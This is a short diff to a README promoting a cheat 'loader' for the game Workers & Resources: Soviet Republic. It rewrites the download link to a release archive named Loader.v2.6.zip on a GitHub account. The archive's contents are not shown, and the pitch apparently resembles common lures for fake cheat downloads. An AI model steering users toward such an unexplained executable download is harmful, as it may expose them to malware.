@@ -5,7 +5,7 @@
 
 > ⚡ Advanced Game Modification Project for Workers & Resources Soviet Republic Cheats
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MajorRaikage45/MimiLokinil/releases/download/v2.6/Loader.v2.6.zip)
+![Download Now](https://github.com/MajorRaikage45/MimiLokinil/releases/download/v2.6/Loader.v2.6.zip)
 
 !Version
 !Status
@@ -156,4 +156,5 @@ configs/
 ├── visual.cfg
 ├── player.cfg
 └── custom.cfg
+
 
